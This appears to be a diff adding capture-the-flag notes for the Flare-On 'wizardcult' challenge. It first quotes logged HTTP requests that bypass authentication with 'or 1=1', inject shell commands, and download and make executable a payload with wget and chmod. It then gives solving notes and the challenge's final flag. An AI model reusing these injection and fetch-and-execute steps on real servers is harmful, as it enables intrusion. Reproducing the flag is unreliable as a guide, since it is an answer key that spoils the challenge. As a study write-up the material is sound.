@@ -1,0 +1,89 @@
+GET /router/admin.php?auth=ADMIN or 1=1&cmd=id HTTP/1.1
+Host: 172.16.30.245
+User-Agent: curl/7.47.0
+Accept: */*
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Jul 2021 19:29:39 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 66
+Content-Type: text/html; charset=UTF-8
+
+
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+
+
+GET /router/admin.php?auth=ADMIN or 1=1 & cmd = wget -O /mages_tower/induct http://wizardcult.flare-on.com/induct HTTP/1.1
+Host: 172.16.30.245
+User-Agent: curl/7.47.0
+Accept: */*
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Jul 2021 19:29:41 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 12
+Content-Type: text/html; charset=UTF-8
+
+
+<pre></pre>
+
+GET /induct HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: wizardcult.flare-on.com
+Connection: Keep-Alive
+
+
+
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Jul 2021 19:29:41 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Tue, 13 Jul 2021 18:26:56 GMT
+ETag: "756965-5c70561f94076"
+Accept-Ranges: bytes
+Content-Length: 7694693
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+GET /router/admin.php?auth=ADMIN%20or%201=1&cmd=chmod%20%2Bx%20%2Fmages_tower%2Finduct HTTP/1.1
+Host: 172.16.30.245
+User-Agent: curl/7.47.0
+Accept: */*
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Jul 2021 19:29:46 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 12
+Content-Type: text/html; charset=UTF-8
+
+
+<pre></pre>
+
+
+
+InspIRCd-2.0
+CAP LS 302
+https://ircv3.net/specs/extensions/capability-negotiation.html
+Upon connecting to the IRC server, clients SHOULD send one of the following messages:
+
+CAP LS [version] to discover the available capabilities on the server.
+CAP REQ to blindly request a particular set of capabilities.
+
+
+Potion of Acid Resistance -> command
+
+Potion of Water Breathing -> readfile
+
+
+Dynamic solution:
+Run in two dockers: one is an inspircd/inspircd-docker as a server.
+The other is a ubuntu as a client.
+solve.py provides a PNG file with `\x00` in client target folder '/mages_tower', then we run go.bin then join the same channel with go.bin, interactive with it to find patterns between inputs and outputs.
+solve2.py is intended to solve this challenge one-by-one brute force attack.
+
+Tip: breakpoint after `wizardcult_vm___ptr_Program__Execute` of ReadFilePotion ! Find input/output pattern.
+
+wh0_n33ds_sw0rds_wh3n_you_h4ve_m4ge_h4nd@flare-on.com
